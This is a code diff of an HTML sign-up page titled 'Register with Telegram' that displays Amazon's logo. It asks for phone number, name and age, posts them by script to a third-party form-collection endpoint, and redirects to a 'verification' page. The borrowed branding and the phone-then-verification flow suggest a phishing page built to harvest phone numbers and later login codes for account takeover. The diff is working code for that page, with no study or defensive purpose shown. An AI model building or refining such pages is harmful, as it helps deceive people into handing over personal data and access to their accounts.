@@ -64,20 +64,44 @@
 <body>
 
   <div class="form-container">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
+    <!-- ✅ Replace this with your own logo later -->
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Logo" />
     <h2>Register with Telegram</h2>
 
-    <form action="https://formspree.io/f/mgvydbna" method="POST">
-      <input type="hidden" name="form" value="registration" />
-      <input type="hidden" name="_redirect" value="verification.html" />
-      
+    <form id="myForm">
       <input type="tel" name="Phone Number" placeholder="Phone Number" required />
       <input type="text" name="Name" placeholder="Your Name" required />
       <input type="number" name="Age" placeholder="Your Age" min="1" max="120" required />
-      
       <button type="submit">Next</button>
     </form>
   </div>
 
+  <script>
+    const form = document.getElementById('myForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const data = new FormData(form);
+      const endpoint = "https://formspree.io/f/mgvydbna";
+
+      try {
+        const response = await fetch(endpoint, {
+          method: "POST",
+          body: data,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (response.ok) {
+          window.location.href = "verification.html";
+        } else {
+          alert("Error submitting form.");
+        }
+      } catch (err) {
+        alert("Submission failed.");
+      }
+    });
+  </script>
 </body>
 </html>
